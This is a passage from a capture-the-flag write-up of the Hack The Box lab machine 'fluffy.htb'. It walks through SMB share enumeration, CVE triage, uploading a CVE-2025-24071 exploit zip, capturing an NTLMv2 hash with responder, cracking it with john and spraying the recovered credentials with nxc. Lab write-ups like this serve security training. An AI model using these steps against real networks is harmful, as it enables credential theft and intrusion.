</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span>---------<span class="w">       </span>----<span class="w">      </span>-------
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">    </span>IT<span class="w">              </span>Disk<span class="w">      </span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">    </span>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">    </span>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div></p>
<p>lets explore the IT share since it appears to be a non systemic/default one<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>smbclient<span class="w"> </span>-U<span class="w"> </span>j.fleischman<span class="w"> </span>//fluffy.htb/IT
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>└──╼<span class="w"> </span><span class="nv">$smbclient</span><span class="w"> </span>//fluffy.htb/IT<span class="w"> </span>-U<span class="w"> </span>j.fleischman
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\j</span>.fleischman<span class="o">]</span>:
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">04</span>:35:18<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">04</span>:35:18<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">  </span>Everything-1.4.1.1026.x64<span class="w">           </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:08:44<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">  </span>Everything-1.4.1.1026.x64.zip<span class="w">       </span>A<span class="w">  </span><span class="m">1827464</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:04:05<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">  </span>KeePass-2.58<span class="w">                        </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:08:38<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">  </span>KeePass-2.58.zip<span class="w">                    </span>A<span class="w">  </span><span class="m">3225346</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">18</span>:03:17<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">  </span>Upgrade_Notice.pdf<span class="w">                  </span>A<span class="w">   </span><span class="m">169963</span><span class="w">  </span>Sat<span class="w"> </span>May<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">17</span>:31:07<span class="w"> </span><span class="m">2025</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">        </span><span class="m">5842943</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1328928</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div></p>
<h3 id="inspecting-shares-contents">Inspecting share's contents</h3>
<p>Lets download those locally and inspect them:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>get<span class="w"> </span>Everything-1.4.1.1026.x64.zip
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>get<span class="w"> </span>KeePass-2.58.zip<span class="w"> </span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>get<span class="w"> </span>Upgrade_Notice.pdf<span class="w"> </span>
</span></code></pre></div></p>
<h4 id="inspecting-the-pdf-file">Inspecting the PDF file</h4>
<ul>
<li>First, lets inspect the pdf file, there are 3 pages:<br />
<img alt="Pasted image 20250603214807" src="../MediaFiles/Pasted%20image%2020250603214807.png" /><br />
<img alt="Pasted image 20250603214703" src="../MediaFiles/Pasted%20image%2020250603214703.png" /><br />
<img alt="Pasted image 20250603214845" src="../MediaFiles/Pasted%20image%2020250603214845.png" /><br />
Interesting, the 2nd page of the pdf just gives out what the machine is vulnerable to:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>CVE-2025-24996 | Critical
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>CVE-2025-24071 | Critical
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>CVE-2025-46785 | High
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>CVE-2025-29968 | High
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>CVE-2025-21193 | Medium
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>CVE-2025-3445  | Low
</span></code></pre></div><br />
Lets analyze those CVEs one by one:</li>
</ul>
<h5 id="analyzing-the-cves-mentioned-inside-the-pdf">Analyzing the CVEs mentioned inside the PDF</h5>
<ul>
<li>
<p>CVE-2025-24996 | Critical<br />
https://www.cve.org/CVERecord?id=CVE-2025-24996<br />
<code>External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.</code><br />
<img alt="Pasted image 20250603221600" src="../MediaFiles/Pasted%20image%2020250603221600.png" /></p>
</li>
<li>
<p>CVE-2025-24071 | Critical<br />
https://github.com/ThemeHackers/CVE-2025-24071<br />
<code>The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat.</code><br />
<img alt="Pasted image 20250603221728" src="../MediaFiles/Pasted%20image%2020250603221728.png" /><br />
found this poc: https://github.com/0x6rss/CVE-2025-24071_PoC<br />
keep that in mind for later, and lets find more about the rest of the CVEs:</p>
</li>
<li>
<p>CVE-2025-46785 | High<br />
<code>Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.</code><br />
https://www.cvedetails.com/cve/CVE-2025-46785/<br />
<img alt="Pasted image 20250603222002" src="../MediaFiles/Pasted%20image%2020250603222002.png" /></p>
</li>
<li>
<p>CVE-2025-29968 | High<br />
<code>Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.</code><br />
<img alt="Pasted image 20250603222047" src="../MediaFiles/Pasted%20image%2020250603222047.png" /></p>
</li>
<li>
<p>CVE-2025-21193 | Medium<br />
<code>Active Directory Federation Server Spoofing Vulnerability</code><br />
<img alt="Pasted image 20250603222230" src="../MediaFiles/Pasted%20image%2020250603222230.png" /></p>
</li>
<li>
<p>CVE-2025-3445  | Low<br />
https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVER-9689905<br />
<img alt="Pasted image 20250603222357" src="../MediaFiles/Pasted%20image%2020250603222357.png" /><br />
<img alt="Pasted image 20250603222437" src="../MediaFiles/Pasted%20image%2020250603222437.png" /><br />
So we analyzed what each CVE describes, but in order to decide which one to chose i decided to also check the rest of the files in case any correlations with the CVEs exist:</p>
</li>
</ul>
<h3 id="inspecting-the-rest-of-the-files">Inspecting the rest of the files</h3>
<ul>
<li>
<p>then lets inspect the Everything-1.4.1.1026.x64.zip<br />
<img alt="Pasted image 20250603214959" src="../MediaFiles/Pasted%20image%2020250603214959.png" /><br />
hm we see an exe and an .lng file here... nothing comes to my mind except that it refers to an app called Everything, which is used for searching stuff on a windows machine.</p>
</li>
<li>
<p>lets unzip the KeePass-2.58.zip <br />
<img alt="Pasted image 20250603215248" src="../MediaFiles/Pasted%20image%2020250603215248.png" /><br />
From all those folders and files, the most interesting ones where:</p>
</li>
</ul>
<p>KeePass-2.58.zip:</p>
<p>From the file name, we can see that the version is 2.58, which is also validated by its contents:<br />
<div class="language-xml highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nt">&lt;configuration&gt;</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="nt">&lt;startup</span><span class="w"> </span><span class="na">useLegacyV2RuntimeActivationPolicy=</span><span class="s">&quot;true&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">        </span><span class="nt">&lt;supportedRuntime</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;v4.0&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">        </span><span class="nt">&lt;supportedRuntime</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;v2.0.50727&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nt">&lt;/startup&gt;</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="nt">&lt;runtime&gt;</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">        </span><span class="nt">&lt;assemblyBinding</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">            </span><span class="nt">&lt;dependentAssembly&gt;</span>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">                </span><span class="nt">&lt;assemblyIdentity</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;KeePass&quot;</span>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">                    </span><span class="na">publicKeyToken=</span><span class="s">&quot;fed2ed7716aecf5c&quot;</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">                    </span><span class="na">culture=</span><span class="s">&quot;neutral&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="w">                </span><span class="nt">&lt;bindingRedirect</span><span class="w"> </span><span class="na">oldVersion=</span><span class="s">&quot;2.0.9.0-2.57.127.127&quot;</span>
</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">                    </span><span class="na">newVersion=</span><span class="s">&quot;2.58.0.0&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">            </span><span class="nt">&lt;/dependentAssembly&gt;</span>
</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">        </span><span class="nt">&lt;/assemblyBinding&gt;</span>
</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">        </span><span class="nt">&lt;enforceFIPSPolicy</span><span class="w"> </span><span class="na">enabled=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">        </span><span class="nt">&lt;loadFromRemoteSources</span><span class="w"> </span><span class="na">enabled=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="w">    </span><span class="nt">&lt;/runtime&gt;</span>
</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="w">    </span><span class="nt">&lt;appSettings&gt;</span>
</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">key=</span><span class="s">&quot;EnableWindowsFormsHighDpiAutoResizing&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="w">    </span><span class="nt">&lt;/appSettings&gt;</span>
</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="nt">&lt;/configuration&gt;</span>
</span></code></pre></div><br />
Interesting, it contains a publickey token, i dont know yet where it could be used</p>
<p>XSL folder:<br />
<img alt="Pasted image 20250603215432" src="../MediaFiles/Pasted%20image%2020250603215432.png" /><br />
To sump up:<br />
KDBX_Common.xsl -&gt; nothing interesting<br />
KDBX_DetailsFull_HTML.xsl -&gt; nothing interesting<br />
KDBX_DetailsLight_HTML.xsl -&gt; nothing interesting<br />
KDBX_Tabular_HTML.xsl -&gt; nothing interesting</p>
<p>Nothing interesting found by observing each one, overakk it appears to be some sort of <code>XSL</code> (Extensible Stylesheet Language), does not provide any additional information though regarding any CVE mentioned above. </p>
<hr />
<h1 id="foothold">Foothold</h1>
<p>I decided to search for the most suitable CVE to exploit by severity starting with the <code>Critical</code> ones. <br />
By searching online i found an exploit for CVE-2025-24071</p>
<h2 id="exploiting-cve-2025-24071-leaking-ntlm-hash">Exploiting CVE-2025-24071 (Leaking NTLM hash)</h2>
<p>Using this script: https://github.com/ThemeHackers/CVE-2025-24071<br />
type your ip, and a random filename, and run, it should produce a <code>.zip</code> file as seen below (exploit.zip).</p>
<h3 id="uploading-the-script-via-smbclient">Uploading the script via smbclient</h3>
<p>then upload the automatically generated <code>exploit.zip</code> file through the smbclient: ( i am on the same directory as the exploit.zip thats why i dont specify path on the put command)<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>┌─<span class="o">[</span>ch3ckm8@parrot<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>└──╼<span class="w"> </span><span class="nv">$smbclient</span><span class="w"> </span>//fluffy.htb/IT<span class="w"> </span>-U<span class="w"> </span>j.fleischman
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\j</span>.fleischman<span class="o">]</span>:
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>put<span class="w"> </span>exploit.zip
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>putting<span class="w"> </span>file<span class="w"> </span>exploit.zip<span class="w"> </span>as<span class="w"> </span><span class="se">\e</span>xploit.zip<span class="w"> </span><span class="o">(</span><span class="m">1</span>,9<span class="w"> </span>kb/s<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">1</span>,9<span class="w"> </span>kb/s<span class="o">)</span>
</span></code></pre></div></p>
<h3 id="listen-for-incoming-connections">Listen for incoming connections</h3>
<p>run responder locally: <br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-wvF
</span></code></pre></div></p>
<p>aaand we captured NTML hashes!<br />
<img alt="Pasted image 20250603224638" src="../MediaFiles/Pasted%20image%2020250603224638.png" /><br />
niiice, lets take on of those hashes with the prospect of cracking it:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.10.11.69
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>FLUFFY<span class="se">\p</span>.agila
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>p.agila::FLUFFY:2a097c3f1a0c7581:80E5B1A96F15F5076A3B681FF87BDE8C:010100000000000080099B54D9D4DB01990B5BC68162BEAB00000000020008004B0046005300530001001E00570049004E002D00490052004C005900440056004B0047004F003300590004003400570049004E002D00490052004C005900440056004B0047004F00330059002E004B004600530053002E004C004F00430041004C00030014004B004600530053002E004C004F00430041004C00050014004B004600530053002E004C004F00430041004C000700080080099B54D9D4DB010600040002000000080030003000000000000000010000000020000072DDB7D8290D0A32F8E8F001645979B3FC245530E93B4B6A0268EF43636C1BD50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100340034000000000000000000
</span></code></pre></div></p>
<h2 id="cracking-ntlm-hash">Cracking NTLM hash</h2>
<p>Put it on a txt (the whole NTLMv2-SSP Hash value), and attempted to crack it with john:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>└──╼<span class="w"> </span><span class="nv">$john</span><span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>netntlmv2,<span class="w"> </span>NTLMv2<span class="w"> </span>C/R<span class="w"> </span><span class="o">[</span>MD4<span class="w"> </span>HMAC-MD5<span class="w"> </span><span class="m">32</span>/64<span class="o">])</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>Will<span class="w"> </span>run<span class="w"> </span><span class="m">2</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>prometheusx-303<span class="w">  </span><span class="o">(</span>p.agila<span class="o">)</span><span class="w">     </span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>1g<span class="w"> </span><span class="m">0</span>:00:00:02<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2025</span>-06-03<span class="w"> </span><span class="m">23</span>:11<span class="o">)</span><span class="w"> </span><span class="m">0</span>.4901g/s<span class="w"> </span>2214Kp/s<span class="w"> </span>2214Kc/s<span class="w"> </span>2214KC/s<span class="w"> </span>promo010..programmer_pt
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show --format=netntlmv2&quot;</span><span class="w"> </span>options<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>Session<span class="w"> </span>completed.
</span></code></pre></div><br />
so now we have more creds:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>p.agila
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>prometheusx-303
</span></code></pre></div><br />
Next, we will check where we can login with these.</p>
<h2 id="correlating-creds-with-services_1">Correlating creds with services</h2>
<p>lets try to login now with these creds, by checking first with our nxc script:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>mssql<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ssh<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>winrm<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\p</span>.agila:prometheusx-303
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>smb<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\p</span>.agila:prometheusx-303<span class="w"> </span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ftp<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ldap<span class="w"> </span>on<span class="w"> </span>fluffy.htb
